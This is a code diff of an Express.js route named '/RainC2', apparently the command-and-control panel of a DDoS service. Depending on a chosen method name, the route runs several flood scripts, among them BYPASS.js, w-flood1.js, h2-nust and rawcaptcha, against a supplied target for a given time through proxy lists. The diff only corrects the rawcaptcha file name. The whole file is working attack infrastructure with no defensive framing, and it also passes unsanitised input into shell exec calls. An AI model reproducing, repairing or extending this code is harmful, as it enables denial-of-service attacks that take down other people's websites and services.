@@ -29,12 +29,12 @@ app.get('/RainC2', (req, res) => {
     exec(`node methods/cibi.js ${target} ${time} 16 3 proxy.txt`);
     exec(`node methods/BYPASS.js ${target} ${time} 32 2 proxy.txt`);
     exec(`node methods/nust.js ${target} ${time} 12 4 proxy.txt`);
-    exec(`node methods/rawcaptcha ${target} ${time} 5 5 6`);
+    exec(`node methods/rawcaptcha.js ${target} ${time} 5 5 6`);
   } else if (methods === 'RAW-HTTP') {
     console.log('received');
     exec(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`);
     exec(`node methods/http-panel.js ${target} ${time}`);
-    exec(`node methods/rawcaptcha ${target} ${time} 5 5 6`);
+    exec(`node methods/rawcaptcha.js ${target} ${time} 5 5 6`);
   } else if (methods === 'R9') {
     console.log('received');
     exec(`node methods/high-dstat.js ${target} ${time} 32 7 proxy.txt`);
@@ -42,7 +42,7 @@ app.get('/RainC2', (req, res) => {
     exec(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
     exec(`node methods/nust.js ${target} ${time} 16 2 proxy.txt`);
     exec(`node methods/BYPASS.js ${target} ${time} 8 1 proxy.txt`);
-    exec(`node methods/rawcaptcha ${target} ${time} 5 5 6`);
+    exec(`node methods/rawcaptcha.js ${target} ${time} 5 5 6`);
   } else if (methods === 'PRIV-TOR') {
     console.log('received');
     exec(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);
@@ -50,11 +50,11 @@ app.get('/RainC2', (req, res) => {
     exec(`node methods/cibi.js ${target} ${time} 12 4 proxy.txt`);
     exec(`node methods/BYPASS.js ${target} ${time} 10 4 proxy.txt`);
     exec(`node methods/nust.js ${target} ${time} 10 1 proxy.txt`);
-    exec(`node methods/rawcaptcha ${target} ${time} 5 5 6`);
+    exec(`node methods/rawcaptcha.js ${target} ${time} 5 5 6`);
   } else if (methods === 'HOLD-PANEL') {
     console.log('received');
     exec(`node methods/http-panel.js ${target} ${time}`);
-    exec(`node methods/rawcaptcha ${target} ${time} 5 5 6`);
+    exec(`node methods/rawcaptcha.js ${target} ${time} 5 5 6`);
   } else if (methods === 'R1') {
     console.log('received');
     exec(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);
@@ -65,7 +65,7 @@ app.get('/RainC2', (req, res) => {
             exec(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
     exec(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
     exec(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);
-    exec(`node methods/rawcaptcha ${target} ${time} 5 5 6`);
+    exec(`node methods/rawcaptcha.js ${target} ${time} 5 5 6`);
   }
 });
 
